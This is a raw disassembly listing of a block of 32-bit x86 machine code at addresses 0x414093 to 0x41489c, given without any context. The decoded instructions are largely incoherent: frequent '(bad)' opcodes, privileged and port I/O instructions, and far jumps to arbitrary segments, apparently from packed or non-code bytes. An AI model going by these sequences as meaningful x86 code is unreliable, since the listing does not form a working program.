  414093:	sbb    dl,BYTE PTR [ecx+0x41]
  414096:	pop    esp
  414097:	int3   
  414098:	imul   edx,DWORD PTR [edi+0x15],0xffffff96
  41409c:	imul   esp,DWORD PTR [esp+edx*2-0x2e9c6494],0xffffffd4
  4140a4:	dec    esi
  4140a5:	rol    DWORD PTR [eax+0x3f],cl
  4140a8:	pop    edi
  4140a9:	xor    BYTE PTR [ebp+0x61d99841],ah
  4140af:	add    edi,DWORD PTR [eax]
  4140b1:	adc    BYTE PTR [eax],bl
  4140b3:	xchg   ebx,eax
  4140b4:	mov    dl,0x16
  4140b6:	std    
  4140b7:	jo     0x414129
  4140b9:	mov    ebp,0x31152069
  4140be:	mov    eax,ds:0x363f7df7
  4140c3:	pop    esi
  4140c4:	or     BYTE PTR [esi-0x51273f49],bl
  4140ca:	inc    ebx
  4140cb:	mov    DWORD PTR [ecx*1-0x6152657c],0xddfc529a
  4140d6:	lods   eax,DWORD PTR ds:[esi]
  4140d7:	scas   eax,DWORD PTR es:[edi]
  4140d8:	push   ss
  4140d9:	mov    BYTE PTR [esi+eax*1],cl
  4140dc:	add    BYTE PTR [eax+0x38],bh
  4140df:	pusha  
  4140e0:	cmp    eax,0x3f8142f9
  4140e5:	not    DWORD PTR [esp+edx*8-0x5c3cf389]
  4140ec:	cdq    
  4140ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ee:	jb     0x41412b
  4140f0:	add    DWORD PTR [ebx-0x5fd3c584],0xffffff88
  4140f7:	cld    
  4140f8:	idiv   BYTE PTR [eax+eax*1+0x1d]
  4140fc:	(bad)  
  4140fd:	jecxz  0x41412f
  4140ff:	lds    esi,FWORD PTR [ecx+eiz*4-0x6238926b]
  414106:	adc    eax,edx
  414108:	dec    ecx
  414109:	in     al,dx
  41410a:	mov    edi,0xc1836b4d
  41410f:	cwde   
  414110:	sahf   
  414111:	mov    dh,0x2f
  414113:	add    al,0xf9
  414115:	sub    bl,dh
  414117:	jge    0x414157
  414119:	lahf   
  41411a:	fst    DWORD PTR [edx+0x33]
  41411d:	xchg   ecx,eax
  41411e:	sbb    DWORD PTR [ecx],edx
  414120:	adc    bl,BYTE PTR [ebp-0x71]
  414123:	fimul  DWORD PTR [edx+0x75]
  414126:	sub    DWORD PTR [edi],ebp
  414128:	push   ecx
  414129:	push   esi
  41412a:	imul   esp,DWORD PTR [eax-0x29],0xb5d934af
  414131:	mov    cl,0x5a
  414133:	lock push edi
  414135:	cdq    
  414136:	test   DWORD PTR [esi+eiz*8-0x78],edx
  41413a:	pop    ecx
  41413b:	push   edi
  41413c:	nop
  41413d:	jp     0x414119
  41413f:	push   cs
  414140:	jp     0x4140e6
  414142:	int3   
  414143:	addr16 (bad) 
  414145:	icebp  
  414146:	into   
  414147:	pusha  
  414148:	xchg   ebp,eax
  414149:	xchg   ebx,eax
  41414a:	fimul  DWORD PTR [ebp+0x1eff4657]
  414150:	in     al,dx
  414151:	or     eax,0x7fe683e9
  414156:	cmp    al,0xfd
  414158:	inc    ebx
  414159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41415a:	mov    eax,ds:0x7c91d118
  41415f:	adc    eax,0x3b58b431
  414164:	and    eax,0x7d915915
  414169:	sti    
  41416a:	xor    eax,0xdbe8f9b
  41416f:	pop    edx
  414170:	mov    ecx,0xf8bf460c
  414175:	in     eax,dx
  414176:	push   ds
  414177:	jecxz  0x41417c
  414179:	xchg   DWORD PTR [ecx+0x62b724f],eax
  41417f:	pop    esi
  414180:	pop    esi
  414182:	adc    eax,DWORD PTR [ecx]
  414184:	sub    eax,0xfd3fd0b
  414189:	sbb    eax,0x6e37a8b9
  41418e:	mov    eax,ds:0x438d36dc
  414193:	jbe    0x414202
  414195:	push   ss
  414196:	popa   
  414197:	ds jmp 0x2ed3d2fc
  41419d:	fadd   DWORD PTR [ebx]
  41419f:	inc    esi
  4141a0:	jo     0x414188
  4141a2:	pop    ds
  4141a3:	dec    edx
  4141a4:	stc    
  4141a5:	or     eax,0x32d96007
  4141aa:	hlt    
  4141ab:	repz mov ecx,0xdba98172
  4141b1:	lods   al,BYTE PTR ds:[esi]
  4141b2:	lods   al,BYTE PTR ds:[esi]
  4141b3:	adc    edi,edi
  4141b5:	std    
  4141b6:	out    0x3d,eax
  4141b8:	mov    ds:0xc66d59f9,eax
  4141bd:	icebp  
  4141be:	dec    ebx
  4141bf:	pop    eax
  4141c0:	push   esp
  4141c1:	iret   
  4141c2:	fdivr  QWORD PTR ds:[eax+0x6a9a7607]
  4141c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141ca:	aam    0x19
  4141cc:	fdiv   DWORD PTR [edi-0x5adfcd67]
  4141d2:	add    al,0xb6
  4141d4:	lods   eax,DWORD PTR ds:[esi]
  4141d5:	hlt    
  4141d6:	add    esi,eax
  4141d8:	sbb    eax,0x8d8bb63d
  4141dd:	test   bh,0x18
  4141e0:	mov    cl,0xc4
  4141e2:	sub    ebx,eax
  4141e4:	cmp    DWORD PTR [edx-0x3c],ecx
  4141e7:	mov    edi,0x99c381b4
  4141ec:	mov    ebx,0x88de6574
  4141f1:	mov    ebx,DWORD PTR [ecx+eiz*1-0x4d2384e6]
  4141f8:	dec    edi
  4141f9:	xor    dh,BYTE PTR cs:[ebx+0x1]
  4141fd:	leave  
  4141fe:	xchg   ecx,eax
  4141ff:	and    dh,BYTE PTR [eax-0x3f]
  414202:	jno    0x4141d5
  414204:	rcl    DWORD PTR [ebp+0x5cad40c2],1
  41420a:	pop    esi
  41420b:	mov    ds:0x1c558c84,eax
  414210:	sbb    eax,0x5f51bbde
  414215:	pop    eax
  414216:	pop    edi
  414217:	fwait
  414218:	xor    edx,ebp
  41421a:	push   edi
  41421b:	cmp    DWORD PTR [ebp-0x71],esi
  41421e:	nop
  41421f:	(bad)
  414222:	push   ebp
  414223:	pop    esp
  414224:	call   0x80f1:0x4b19062
  41422b:	popf   
  41422c:	or     eax,0x66da88df
  414231:	cmp    esi,DWORD PTR [esi]
  414233:	pop    edi
  414234:	cld    
  414235:	jg     0x414270
  414237:	push   ss
  414238:	std    
  414239:	aam    0x6f
  41423b:	jmp    0x7326:0xa6058ffb
  414242:	rcl    BYTE PTR [eax+edx*1-0xfa205a7],1
  414249:	mov    ds:0xfc72c62f,al
  41424e:	sbb    ch,BYTE PTR [ecx]
  414250:	fsub   QWORD PTR [ecx+0x2b93bfb5]
  414256:	sub    al,0x5d
  414258:	test   al,0x41
  41425a:	jnp    0x4142b4
  41425c:	lock sub ah,BYTE PTR [edi-0x886aabc]
  414263:	mov    eax,0xeb912ad0
  414268:	pop    esp
  414269:	push   ebp
  41426a:	iret   
  41426b:	dec    ebx
  41426c:	mov    ecx,DWORD PTR [esi+0x102f1aaa]
  414272:	fnstenv ds:0x67385280
  414278:	mov    ah,0xf9
  41427a:	xor    eax,0x83801ac3
  41427f:	dec    ebp
  414280:	mov    eax,es
  414282:	leave  
  414283:	(bad)  
  414284:	mov    bh,0xa2
  414286:	test   DWORD PTR [eax-0x40bae019],eax
  41428c:	lds    edi,FWORD PTR ds:0xd4064ad8
  414292:	loope  0x41428b
  414294:	in     eax,dx
  414295:	adc    dh,al
  414297:	ds sub al,0xc7
  41429a:	jle    0x414221
  41429c:	jns    0x41424c
  41429e:	aad    0x9a
  4142a0:	(bad)  
  4142a1:	and    DWORD PTR [esi-0x209e7ecc],ecx
  4142a7:	das    
  4142a8:	int3   
  4142a9:	mov    ah,0xf
  4142ab:	out    0xa0,eax
  4142ad:	push   cs
  4142ae:	std    
  4142af:	neg    esp
  4142b1:	pop    edx
  4142b2:	popa   
  4142b3:	lock imul edx,DWORD PTR [ebp-0x6add2675],0x308bcab1
  4142be:	mov    bh,0x2d
  4142c0:	dec    esp
  4142c1:	pop    ss
  4142c2:	xchg   edx,eax
  4142c3:	push   esi
  4142c4:	push   es
  4142c5:	pop    ecx
  4142c6:	test   eax,0x123570e
  4142cb:	leave  
  4142cc:	jecxz  0x4142ca
  4142ce:	fsubr  st(4),st
  4142d0:	sub    al,0x53
  4142d2:	fiadd  WORD PTR [edi+0x5d]
  4142d5:	retf   
  4142d6:	adc    BYTE PTR [edx+0x5d6fd785],al
  4142dc:	inc    ebp
  4142dd:	push   edx
  4142de:	push   0x76
  4142e0:	push   ebp
  4142e1:	push   es
  4142e2:	lods   eax,DWORD PTR ds:[esi]
  4142e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142e4:	push   ss
  4142e5:	out    dx,al
  4142e6:	jmp    0x19075452
  4142eb:	mov    bl,0x8e
  4142ed:	and    edx,ebp
  4142ef:	dec    BYTE PTR [ebx+edi*8-0x45]
  4142f3:	ficomp DWORD PTR [edi-0x44]
  4142f6:	retf   0xa4d7
  4142f9:	pop    esi
  4142fa:	es mov ecx,0xbc42b674
  414300:	cdq    
  414301:	call   DWORD PTR [eax+0x8f5706f]
  414307:	popf   
  414308:	jb     0x4142ed
  41430a:	test   eax,0x6ef7a303
  41430f:	jns    0x4142fa
  414311:	pop    edx
  414312:	mov    WORD PTR [ebx+0x6d],gs
  414315:	sub    BYTE PTR [ebp-0x1765ef4],dh
  41431b:	jmp    0x414399
  41431d:	bound  edx,QWORD PTR [ecx+0x4b8e82cc]
  414323:	mov    esp,0x1454714d
  414328:	shl    DWORD PTR [esi+0x6f],0x93
  41432c:	cs (bad) 
  41432e:	ret    
  41432f:	pop    es
  414330:	xchg   edi,esp
  414332:	jecxz  0x414384
  414334:	xor    esi,DWORD PTR [esi+0x198064be]
  41433a:	shl    DWORD PTR [ebp-0x5a24d162],cl
  414340:	fstp   QWORD PTR [edi]
  414342:	jl     0x4142e3
  414344:	jnp    0x414344
  414346:	mov    ebx,0xe8533217
  41434b:	push   ebp
  41434c:	test   BYTE PTR [edx],0x6d
  41434f:	or     edx,eax
  414351:	dec    ebp
  414352:	sbb    cl,BYTE PTR [edi+0x42]
  414355:	inc    esi
  414356:	push   ebx
  414357:	into   
  414358:	loope  0x41434e
  41435a:	adc    esp,DWORD PTR [esp+ecx*8-0x53bc8a9d]
  414361:	out    0xd2,al
  414363:	rcl    DWORD PTR [edi],cl
  414365:	mov    edi,0x89792445
  41436a:	pop    ss
  41436b:	cmc    
  41436c:	add    DWORD PTR [edx-0x6e],ebp
  41436f:	fsubrp st(5),st
  414371:	cwde   
  414372:	jecxz  0x4143cc
  414374:	push   edi
  414375:	mov    WORD PTR [edx],cs
  414377:	mov    ah,0x27
  414379:	loope  0x4143c6
  41437b:	and    DWORD PTR [ebp+0x59],esp
  41437e:	fsubr  st(7),st
  414380:	out    0xe2,al
  414382:	ss mov cl,0x72
  414385:	mov    bl,0x1c
  414387:	(bad)  
  414388:	cmp    BYTE PTR [edi+0x517c0a9b],al
  41438e:	cmp    BYTE PTR [eax+eiz*8+0x6d6845c3],0xb2
  414396:	xor    eax,0x3aea434d
  41439b:	ret    0xb477
  41439e:	scas   eax,DWORD PTR es:[edi]
  41439f:	inc    ebx
  4143a0:	(bad)  
  4143a1:	lock sbb eax,0xa8946336
  4143a7:	and    BYTE PTR [edi-0x30],ch
  4143aa:	jb     0x4143e9
  4143ac:	or     ebp,DWORD PTR [ebp+0x19]
  4143af:	pop    es
  4143b0:	leave  
  4143b1:	pop    ss
  4143b2:	aas    
  4143b3:	push   ebp
  4143b4:	outs   dx,BYTE PTR ds:[esi]
  4143b5:	mov    ecx,0x454706a3
  4143ba:	ins    DWORD PTR es:[edi],dx
  4143bb:	push   ebx
  4143bc:	xchg   esp,eax
  4143bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143be:	ds pop ebp
  4143c0:	clc    
  4143c1:	call   0xf3f859ef
  4143c6:	push   ds
  4143c7:	repnz and al,0x3e
  4143ca:	pushf  
  4143cb:	adc    eax,DWORD PTR [ebx-0x1dccfca5]
  4143d1:	adc    DWORD PTR [esi],ebp
  4143d3:	hlt    
  4143d4:	cld    
  4143d5:	pop    esi
  4143d6:	shl    dl,0x68
  4143d9:	cmp    ah,BYTE PTR [ebx]
  4143db:	cmp    ah,cl
  4143dd:	mov    ebp,0xb3a2b2fe
  4143e2:	xchg   al,dh
  4143e4:	and    dh,dl
  4143e6:	dec    esp
  4143e7:	(bad)  [edi-0x40]
  4143ea:	imul   edx,DWORD PTR ds:0x6402153b,0xffffff96
  4143f1:	sbb    eax,0x2cedcdf
  4143f6:	scas   eax,DWORD PTR es:[edi]
  4143f7:	arpl   WORD PTR [edx+ebp*4],sp
  4143fa:	mov    BYTE PTR ds:0xe9dddcec,0xf2
  414401:	xchg   ecx,eax
  414402:	das    
  414403:	dec    ecx
  414404:	jns    0x4143d4
  414406:	int    0x9a
  414408:	stc    
  414409:	(bad)  
  41440b:	xchg   edi,eax
  41440c:	aas    
  41440d:	xlat   BYTE PTR ds:[bx]
  41440f:	mov    cl,0x5b
  414411:	repz fdivr DWORD PTR [esi+0x4a9ad45c]
  414418:	mov    ah,0x2d
  41441a:	daa    
  41441b:	fcmovnb st,st(2)
  41441d:	xor    BYTE PTR [ebp+0x57],al
  414420:	sbb    eax,0xc9c8107
  414425:	shr    DWORD PTR [edx+0x0],1
  414428:	int3   
  414429:	adc    eax,0xa19e32f8
  41442e:	pop    ss
  41442f:	sar    BYTE PTR [edx-0x21c188e8],0x4b
  414436:	int    0x44
  414438:	es push 0x8be74395
  41443e:	push   esp
  41443f:	iret   
  414440:	fwait
  414441:	js     0x41443e
  414443:	mov    ah,0x38
  414445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414446:	sti    
  414447:	cwde   
  414448:	jbe    0x41447e
  41444a:	loope  0x41442f
  41444c:	sbb    ch,cl
  41444e:	js     0x41442d
  414450:	enter  0x3599,0x49
  414454:	das    
  414455:	jmp    0x38ad:0x9fbe14b9
  41445c:	xchg   esi,eax
  41445d:	sbb    cl,BYTE PTR [eax+0x251c1785]
  414463:	pop    ecx
  414464:	cs add ebx,esi
  414467:	xlat   BYTE PTR ds:[ebx]
  414468:	pop    ss
  414469:	call   0x53e1:0x36e3738f
  414470:	ja     0x41445c
  414472:	push   ds
  414473:	ret    0x3cb2
  414476:	mov    bl,0x72
  414478:	addr16 mov esp,eax
  41447b:	inc    ebx
  41447c:	outs   dx,BYTE PTR ds:[esi]
  41447d:	sbb    al,0xd4
  41447f:	es in  al,0x45
  414482:	int    0x49
  414484:	imul   esp,eax,0xf8dc70b5
  41448a:	adc    DWORD PTR [ebx+0xa],0x70cf70ba
  414491:	mov    WORD PTR [eax-0x69],?
  414494:	mov    ?,WORD PTR [ebx]
  414496:	lock dec ebp
  414498:	fsubr  QWORD PTR [esi-0x56df6e59]
  41449e:	push   es
  41449f:	mov    esi,0x4681f82b
  4144a4:	pop    ebp
  4144a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a6:	sar    edi,1
  4144a8:	and    BYTE PTR [edi-0x18b5f747],al
  4144ae:	lock mov cs,eax
  4144b1:	jle    0x4144ae
  4144b3:	arpl   WORD PTR [eax],bp
  4144b5:	mov    ebp,DWORD PTR [edx]
  4144b7:	push   cs
  4144b8:	rcl    esp,0x32
  4144bb:	xor    BYTE PTR [edx+edi*1],dl
  4144be:	mov    ?,esi
  4144c0:	cli    
  4144c1:	dec    edx
  4144c2:	call   0xcfb5:0x3855ad61
  4144c9:	and    ah,BYTE PTR [ecx]
  4144cb:	mov    BYTE PTR [edx+eax*1],bh
  4144ce:	js     0x414472
  4144d0:	out    0x84,al
  4144d2:	pop    ds
  4144d3:	ins    DWORD PTR es:[edi],dx
  4144d4:	retw   0x14a
  4144d8:	hlt    
  4144d9:	rcl    DWORD PTR [edx+0x3d],0xe1
  4144dd:	xor    eax,0x8765d73f
  4144e2:	mov    edi,0xdccbfb7d
  4144e7:	push   esp
  4144e8:	out    dx,al
  4144e9:	loope  0x4144ae
  4144eb:	dec    edx
  4144ec:	xor    al,0xd8
  4144ee:	and    DWORD PTR [ebx+edx*2],esp
  4144f1:	jo     0x4144e0
  4144f3:	push   ebx
  4144f4:	fiadd  WORD PTR [esi-0x3847975]
  4144fa:	test   al,0x2a
  4144fc:	push   esp
  4144fd:	call   DWORD PTR [esi+eax*2-0xd20cf31]
  414504:	sbb    sp,WORD PTR [ecx-0x67b35445]
  41450b:	sub    DWORD PTR [edi-0x40],ecx
  41450e:	fisttp QWORD PTR [eax-0x2e1b10fd]
  414514:	mov    ebp,0x987af663
  414519:	int    0x71
  41451b:	sbb    eax,0x14b14030
  414520:	xor    al,0x2b
  414522:	pop    ds
  414523:	jmp    0x49b533ad
  414528:	div    BYTE PTR [ebx-0x663f48f0]
  41452e:	and    eax,0x2cfa2434
  414533:	repnz (bad) 
  414535:	mov    DWORD PTR [ecx],ecx
  414537:	fisub  WORD PTR [ebx-0x5e2cd123]
  41453d:	mov    ds:0x652aa958,eax
  414542:	call   0xbdf:0x84bfbcaf
  414549:	stc    
  41454a:	push   cs
  41454b:	push   ds
  41454c:	mov    bl,0x1f
  41454e:	lods   eax,DWORD PTR ds:[esi]
  41454f:	sahf   
  414550:	sub    bl,BYTE PTR [ecx-0x1fdb0cdb]
  414556:	mov    dl,0xee
  414558:	mov    edx,0x1b55f053
  41455d:	push   esp
  41455e:	sub    ecx,DWORD PTR [edi+ebx*1+0x53a55edd]
  414565:	xor    BYTE PTR [esp+edx*1],dl
  414568:	and    BYTE PTR [ebx-0x407d5249],bl
  41456e:	sbb    al,bh
  414570:	xor    dl,BYTE PTR [edx]
  414572:	sub    BYTE PTR [esi-0x29d91bbd],cl
  414578:	dec    edx
  414579:	arpl   WORD PTR [ecx],dx
  41457b:	and    dh,dl
  41457d:	push   ds
  41457e:	sbb    BYTE PTR [ebp-0x26],ah
  414581:	jae    0x414551
  414583:	mov    ebp,0xaa4ef542
  414588:	adc    DWORD PTR [eax-0x35],ecx
  41458b:	gs mov esi,0x3b3db54a
  414591:	inc    ebx
  414592:	fild   QWORD PTR [ebp+0x5d]
  414595:	retf   
  414596:	fcomip st,st(4)
  414598:	fwait
  414599:	inc    ebx
  41459a:	add    edi,ecx
  41459c:	ins    BYTE PTR es:[edi],dx
  41459d:	mov    al,ds:0xe0ea9884
  4145a2:	inc    ecx
  4145a3:	jae    0x4145de
  4145a5:	or     bh,BYTE PTR [ecx+esi*4]
  4145a8:	add    esi,ebx
  4145aa:	push   ds
  4145ab:	mov    ds:0x41f2e092,al
  4145b0:	rcr    ah,0xa6
  4145b3:	pop    ebp
  4145b4:	test   bh,0xfe
  4145b7:	not    edi
  4145b9:	test   DWORD PTR [ebx],edx
  4145bb:	fs (bad) 
  4145bd:	jmp    DWORD PTR [ebx-0xa4cc981]
  4145c3:	fcom   DWORD PTR [ecx-0x3]
  4145c6:	push   edx
  4145c7:	pop    ebx
  4145c8:	sti    
  4145c9:	vmwrite ebp,DWORD PTR [ecx+0x7c43c863]
  4145d0:	js     0x4145a8
  4145d2:	int3   
  4145d3:	sahf   
  4145d4:	shl    DWORD PTR [eax+0x45],1
  4145d7:	adc    ecx,ebx
  4145d9:	inc    esp
  4145da:	dec    esp
  4145db:	add    al,0x91
  4145dd:	test   al,0x7f
  4145df:	and    ecx,ebp
  4145e1:	push   esp
  4145e2:	aaa    
  4145e3:	xchg   ebx,eax
  4145e4:	sar    esi,1
  4145e6:	mov    bh,0x96
  4145e8:	sub    cl,BYTE PTR [ecx+0x13ebd1af]
  4145ee:	add    BYTE PTR [edi],0x12
  4145f1:	imul   DWORD PTR [ecx+edx*8-0x53eddac]
  4145f8:	popf   
  4145f9:	arpl   WORD PTR [edx],si
  4145fb:	inc    edi
  4145fc:	cmp    al,0x6b
  4145fe:	and    eax,0x47bd1bde
  414603:	sar    BYTE PTR [esp+edx*8+0x4e36f60a],cl
  41460a:	fs ins BYTE PTR es:[edi],dx
  41460c:	call   0x12757495
  414611:	pop    esi
  414612:	push   eax
  414613:	pop    eax
  414614:	dec    edx
  414615:	clc    
  414616:	jecxz  0x4145c5
  414618:	sub    DWORD PTR gs:[edx],esi
  41461b:	push   ds
  41461c:	rcr    DWORD PTR [ebx+edi*2],1
  41461f:	js     0x414658
  414621:	add    al,0xc8
  414623:	mov    cl,0xe9
  414625:	adc    DWORD PTR [ecx+esi*2],ebp
  414628:	push   0xc6a6c403
  41462d:	icebp  
  41462e:	(bad)  
  41462f:	mov    ebp,0xff05b362
  414634:	(bad)  
  414635:	jecxz  0x414661
  414637:	shl    BYTE PTR [eax-0x4c],cl
  41463a:	outs   dx,DWORD PTR gs:[esi]
  41463c:	jb     0x41469c
  41463e:	fmul   QWORD PTR [eax-0x2e]
  414641:	fbstp  TBYTE PTR [edx]
  414643:	xor    BYTE PTR [eax+0x5699c419],ch
  414649:	jno    0x4146be
  41464b:	xchg   edi,eax
  41464c:	mov    WORD PTR [ebx],?
  41464e:	loope  0x41461b
  414650:	bound  ebx,QWORD PTR [ebx-0x8]
  414653:	test   eax,0x5f71722a
  414658:	dec    ecx
  414659:	inc    ecx
  41465a:	sub    eax,0xf0d92d01
  41465f:	in     al,dx
  414660:	stos   DWORD PTR es:[edi],eax
  414661:	aam    0x5f
  414663:	add    DWORD PTR [ebp+0x368931bb],0x5ee63dd
  41466d:	ror    al,1
  41466f:	jae    0x4145f4
  414671:	imul   ebp,DWORD PTR [edx],0x97ea1eef
  414677:	imul   bp,WORD PTR [eax],0x46ce
  41467c:	out    dx,eax
  41467d:	ja     0x414604
  41467f:	shl    DWORD PTR [ebx-0x4eab11f4],0xfe
  414686:	or     eax,0x7d3570a2
  41468b:	jo     0x41470c
  41468d:	lea    edx,[ecx+0x41]
  414690:	ins    BYTE PTR es:[edi],dx
  414691:	lds    ebx,FWORD PTR ds:0xb1c1824d
  414697:	jns    0x414630
  414699:	(bad)  
  41469a:	ja     0x4146b8
  41469c:	push   ss
  41469d:	aas    
  41469e:	dec    eax
  41469f:	xor    al,0x8
  4146a1:	iret   
  4146a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a3:	aas    
  4146a4:	aas    
  4146a5:	jne    0x414697
  4146a7:	mov    dl,0x1b
  4146a9:	dec    edx
  4146aa:	xchg   ecx,eax
  4146ab:	push   edx
  4146ac:	clc    
  4146ad:	mov    ah,0x60
  4146af:	std    
  4146b0:	cmp    al,BYTE PTR [ebp+0x2a2390a2]
  4146b6:	dec    esi
  4146b7:	call   0xa917f8c3
  4146bc:	mov    cl,0x24
  4146be:	stc    
  4146bf:	dec    esp
  4146c0:	pop    ss
  4146c1:	fsub   DWORD PTR [edx-0x74ad3aa]
  4146c7:	inc    esi
  4146c8:	lods   al,BYTE PTR ds:[esi]
  4146c9:	xor    eax,0x779f4c19
  4146ce:	out    0xcc,eax
  4146d0:	jae    0x414674
  4146d2:	outs   dx,BYTE PTR ds:[esi]
  4146d3:	sub    eax,0xe9c7961
  4146d8:	jmp    0x4146d3
  4146da:	iret   
  4146db:	adc    DWORD PTR [esi],ebx
  4146dd:	lea    edi,[ecx+esi*8]
  4146e0:	mov    al,0xfa
  4146e2:	in     al,0x8a
  4146e4:	ds dec esi
  4146e6:	sbb    dh,BYTE PTR [ebx+0x4e144904]
  4146ec:	sbb    al,0x84
  4146ee:	loopne 0x4146ff
  4146f0:	xchg   edx,eax
  4146f1:	jmp    0x72e9431f
  4146f6:	call   0x535bb069
  4146fb:	mov    ebp,0x283e437
  414700:	aas    
  414701:	fimul  DWORD PTR [ebx+edi*2+0x6651c27a]
  414708:	inc    esp
  414709:	mov    edi,ebx
  41470b:	pop    eax
  41470c:	addr16 jmp 0x4146bc
  41470f:	jl     0x4146e0
  414711:	sbb    cl,bh
  414713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414714:	out    dx,al
  414715:	push   ss
  414716:	test   BYTE PTR [ebp-0x77ecd068],ah
  41471c:	test   al,0xb0
  41471e:	(bad)  
  41471f:	xchg   esi,eax
  414720:	sar    BYTE PTR [ebx+0xbdd3c67],0xc0
  414727:	mov    esp,0x2fabdc1e
  41472c:	int3   
  41472d:	pop    ebp
  41472e:	mov    BYTE PTR [ebx+0x1f],bl
  414731:	outs   dx,BYTE PTR ds:[esi]
  414732:	cdq    
  414733:	loope  0x414702
  414735:	jbe    0x4146e3
  414737:	or     al,cl
  414739:	jle    0x41479a
  41473b:	mov    esp,DWORD PTR [esi]
  41473d:	sbb    DWORD PTR [esp+ebx*2],edx
  414740:	arpl   bp,si
  414742:	push   edi
  414743:	(bad)  
  414744:	and    DWORD PTR gs:[esp+ebp*2],0x55f704c2
  41474c:	test   al,0x8c
  41474e:	sbb    al,0x1b
  414750:	scas   al,BYTE PTR es:[edi]
  414751:	xchg   esp,eax
  414752:	jmp    FWORD PTR [ebx]
  414754:	adc    BYTE PTR [ebx],bh
  414756:	(bad)  
  414757:	mov    edx,0xc5fed23d
  41475c:	nop
  41475d:	mov    al,0xb2
  41475f:	and    esi,DWORD PTR [ecx-0x7d]
  414762:	jmp    0xa767:0x73b4ed01
  414769:	cmp    eax,0xd303190a
  41476e:	jg     0x414741
  414770:	xchg   DWORD PTR [ebx-0xf056db3],esp
  414776:	pop    ds
  414777:	push   sp
  414779:	and    ebp,DWORD PTR [edx+0x12]
  41477c:	jle    0x41472f
  41477e:	bound  ecx,QWORD PTR [ebx]
  414780:	or     ebp,DWORD PTR [ecx-0x37]
  414783:	iret   
  414784:	mov    dl,0x5b
  414786:	sub    BYTE PTR [edx+edx*8+0x1bac6f81],bh
  41478d:	lahf   
  41478e:	mov    BYTE PTR [edi-0x77],al
  414791:	mov    ah,BYTE PTR [edi-0x4bb6daf3]
  414797:	ins    DWORD PTR es:[edi],dx
  414798:	xor    al,0xa5
  41479a:	cmp    eax,0x2b24ca1
  41479f:	ja     0x414726
  4147a1:	lods   al,BYTE PTR ds:[esi]
  4147a2:	test   eax,0x88f31ab9
  4147a7:	jbe    0x41481d
  4147a9:	dec    esi
  4147aa:	enter  0x5f09,0x6a
  4147ae:	adc    edx,DWORD PTR [ebp+0x222ce2e3]
  4147b4:	dec    ebp
  4147b5:	adc    edx,ebp
  4147b7:	mov    ah,0x4a
  4147b9:	iret   
  4147ba:	or     al,0x3f
  4147bc:	shld   DWORD PTR [esi+eiz*2-0x318972f1],edi,cl
  4147c4:	dec    esi
  4147c5:	(bad)  
  4147c6:	sbb    ecx,DWORD PTR [ebp+0x6d]
  4147c9:	mov    ds:0x90f23b4b,eax
  4147ce:	call   0x72699a36
  4147d3:	out    0x78,al
  4147d5:	pop    eax
  4147d6:	adc    ecx,DWORD PTR [eax-0x736f112f]
  4147dc:	lahf   
  4147dd:	or     esi,eax
  4147df:	push   0xffffffc5
  4147e1:	sbb    ebp,0xa326eabf
  4147e7:	shr    DWORD PTR [esi],cl
  4147e9:	xor    eax,DWORD PTR [ebp+0x61]
  4147ec:	in     al,dx
  4147ed:	stos   BYTE PTR es:[edi],al
  4147ee:	cld    
  4147ef:	pushf  
  4147f0:	mov    ah,0xfc
  4147f2:	cmp    al,0xa2
  4147f4:	sbb    dl,BYTE PTR [edi+eax*8-0x12]
  4147f8:	into   
  4147f9:	dec    eax
  4147fa:	dec    esi
  4147fb:	lods   eax,DWORD PTR ds:[esi]
  4147fc:	jo     0x4147f5
  4147fe:	mov    bl,0x97
  414800:	inc    ecx
  414801:	fcomp  st(2)
  414803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414804:	cmp    ebx,edi
  414806:	aaa    
  414807:	push   esp
  414808:	in     al,0x54
  41480a:	out    0x70,al
  41480c:	pop    es
  41480d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480e:	mov    al,0xee
  414810:	push   ss
  414811:	outs   dx,DWORD PTR ds:[esi]
  414812:	jne    0x414801
  414814:	test   al,0x91
  414816:	shl    BYTE PTR [ebp-0x70e18870],1
  41481c:	sub    ch,dh
  41481e:	jmp    0x41485a
  414820:	jo     0x4147a5
  414822:	mov    al,ds:0x94e54c49
  414827:	mov    esi,0x6c7b3005
  41482c:	xchg   esi,eax
  41482d:	dec    ebp
  41482e:	mov    WORD PTR [ebp-0x623a03b4],ss
  414834:	gs sbb eax,0xc29e2d1f
  41483a:	ds stos BYTE PTR es:[edi],al
  41483c:	(bad)  
  41483d:	pop    ss
  41483e:	rol    DWORD PTR [edi],cl
  414840:	ficom  WORD PTR [edi+0x2812adf9]
  414846:	outs   dx,DWORD PTR cs:[esi]
  414848:	out    0xcd,al
  41484a:	int    0xae
  41484c:	xor    al,0x90
  41484e:	(bad)  
  41484f:	leave  
  414850:	pop    eax
  414851:	arpl   WORD PTR [edx],ax
  414853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414854:	shl    BYTE PTR [ebp+0x60e299f9],0xca
  41485b:	and    BYTE PTR [eax+0x58],bl
  41485e:	pop    esp
  41485f:	iret   
  414860:	dec    ebx
  414861:	js     0x41487c
  414863:	(bad)  
  414864:	cs jb  0x414895
  414867:	repnz lidtd [esi-0x1d]
  41486c:	jmp    0xed9ba5b
  414871:	outs   dx,DWORD PTR ss:[esi]
  414873:	cli    
  414874:	or     dl,BYTE PTR [ebp-0x69a38ada]
  41487a:	pop    es
  41487b:	loop   0x414810
  41487d:	pop    esi
  41487e:	jns    0x414885
  414880:	sbb    esi,DWORD PTR [eax-0x598b7003]
  414886:	mov    al,0x96
  414888:	mov    al,ds:0x8c4f631e
  41488d:	retf   0x1b03
  414890:	js     0x4148d1
  414892:	jnp    0x4148a9
  414894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414895:	and    BYTE PTR [ebx+0x34],0x2c
  414899:	icebp  
  41489a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41489c:	aad    0xa2
